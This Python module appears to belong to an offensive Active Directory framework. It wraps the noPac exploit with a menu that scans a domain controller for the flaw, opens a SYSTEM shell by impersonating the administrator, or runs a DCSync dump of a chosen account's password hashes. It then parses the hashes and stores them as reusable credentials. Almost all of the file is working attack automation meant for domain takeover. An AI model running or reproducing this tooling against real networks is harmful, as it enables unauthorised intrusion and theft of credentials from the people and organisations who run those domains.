PROVIDES = ["exec"]
REQUIRES = ["creds"]

def run(data, cred, args):

    import os
    import subprocess

    from datetime import datetime

    from core.paths import (
        get_artifacts_dir,
        get_tools_dir
    )

    from core.target import (
        target_add_cred
    )

    from modules.parse.hash import (
        parse_line
    )

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    domain = data.get(
        "domain"
    )

    dc_ip = data.get(
        "ip"
    )

    target_name = data.get(
        "name"
    )

    if not domain or not dc_ip:

        print(
            f"{R}[!] {W}Missing domain or DC IP"
        )

        return

    if not cred:

        print(
            f"{R}[!] {W}No credentials selected"
        )

        return

    print(
        f"\n{B}┌── NOPAC ────────────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  Select Action                    {B}│{W}"
    )

    print(
        f"{B}└─────────────────────────────────────┘{W}\n"
    )

    print(
        f"  {B}[1]{W} Check Vulnerable"
    )

    print(
        f"  {B}[2]{W} SYSTEM Shell"
    )

    print(
        f"  {B}[3]{W} DCSync Administrator\n"
    )

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    nopac_dir = (
        get_tools_dir()
        / "noPac"
    )

    scanner = (
        nopac_dir
        / "scanner.py"
    )

    nopac = (
        nopac_dir
        / "noPac.py"
    )

    user = cred["user"]

    if "\\" in user:

        user = (
            user.split(
                "\\"
            )[-1]
        )

    typ = cred["type"]
    dc_host = data.get("hostname")
    secret = (
        cred.get("secret")
        or cred.get("ccache")
    )

    env = os.environ.copy()

    auth = ""
    auth_flags = ""

    #
    # AUTH
    #

    if typ == "password":

        auth = (
            f"{domain}/{user}:{secret}"
        )

    elif typ == "ntlm":

        auth = (
            f"{domain}/{user}"
        )

        auth_flags = (
            f"-hashes :{secret}"
        )

    elif typ in [
        "ticket",
        "ccache"
    ]:

        auth = (
            f"{domain}/{user}"
        )

        auth_flags = (
            "-k -no-pass"
        )

        env[
            "KRB5CCNAME"
        ] = secret

    else:

        print(
            f"{R}[!] {W}Unsupported credential type"
        )

        return

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    #
    # OPTION 1
    #

    if choice == "1":

        logfile = (
            get_artifacts_dir(
                target_name
            )
            / f"nopac_scan_{timestamp}.log"
        )

        cmd = (
            f"python3 {scanner} "
            f"{auth} "
            f"{auth_flags} "
            f"-dc-ip {dc_ip} "
            f"-use-ldap"
        )

        print(
            f"\n{B}[*]{W} NoPac Vulnerability Scan\n"
        )

        print(
            cmd
        )

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            env=env
        )

        output = (
            result.stdout
            + result.stderr
        )

        print(
            output
        )

        logfile.write_text(
            output
        )

        print(
            f"\n{G}[+] {W}Saved\n"
        )

        print(
            f"  └── {logfile}"
        )

        return

    #
    # OPTION 2
    #

    elif choice == "2":

        

        cmd = (
            f"python3 {nopac} "
            f"{auth} "
            f"{auth_flags} "
            f"-dc-ip {dc_ip} "
            f"-dc-host {dc_host} "
            f"--impersonate administrator "
            f"-shell "
            f"-use-ldap"
        )

        print(
        f"{Y}{cmd}{W}\n"
        )

        print(
            f"\n{B}[*]{W} Launching NoPac Shell\n"
        )

        subprocess.run(
            cmd,
            shell=True,
            env=env
        )

        return

    #
    # OPTION 3
    #

    elif choice == "3":

        target = input(
            f"{Y}Target User [{C}Administrator{Y}]> {W}"
        ).strip()

        if not target:

            target = "Administrator"

        if "/" not in target:

            netbios = (
                domain.split(
                    "."
                )[0]
                .upper()
            )

            target = (
                f"{netbios}/{target}"
            )

        safe_target = (
            target
            .replace("/", "_")
            .lower()
        )

        logfile = (
            get_artifacts_dir(
                target_name
            )
            / f"{safe_target}_nopac_{timestamp}.log"
        )

        hashes_file = (
            get_artifacts_dir(
                target_name
            )
            / f"{safe_target}_nopac_hashes.txt"
        )
        cmd = (
            f"python3 {nopac} "
            f"{auth} "
            f"{auth_flags} "
            f"-dc-ip {dc_ip} "
            f"-dc-host {dc_host} "
            f"--impersonate administrator "
            f"-use-ldap "
            f"-dump "
            f"-just-dc-user {target}"
        )

        print(
            f"\n{B}[*]{W} NoPac DCSync\n"
        )

        print(f"{Y}{cmd}{W}")

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            env=env
        )

        output = (
            result.stdout
            + result.stderr
        )

        print(
            output
        )

        logfile.write_text(
            output
        )

        found = []

        for line in output.splitlines():

            parsed = parse_line(
                line.strip()
            )

            if parsed:

                found.append(
                    parsed
                )

        if found:

            hashes_file.write_text(
                "\n".join(
                    f"{c['user']}:{c['secret']}"
                    for c in found
                    if c["type"] == "ntlm"
                )
            )

            import argparse

            for c in found:

                if c["type"] == "ntlm":

                    target_add_cred(
                        argparse.Namespace(
                            user=c["user"],
                            password=None,
                            hash=c["secret"],
                            aes=None,
                            ccache=None
                        )
                    )

                elif c["type"] == "password":

                    target_add_cred(
                        argparse.Namespace(
                            user=c["user"],
                            password=c["secret"],
                            hash=None,
                            aes=None,
                            ccache=None
                        )
                    )

            print(
                f"\n{G}[+] {W}{len(found)} account(s) recovered\n"
            )

            for c in found:

                print(
                    f"  ├── {c['user']}"
                )

        else:

            print(
                f"\n{R}[!] {W}No accounts recovered"
            )

        print(
            f"\n{G}[+] {W}Saved\n"
        )

        print(
            f"  ├── {hashes_file}"
        )

        print(
            f"  └── {logfile}"
        )

        return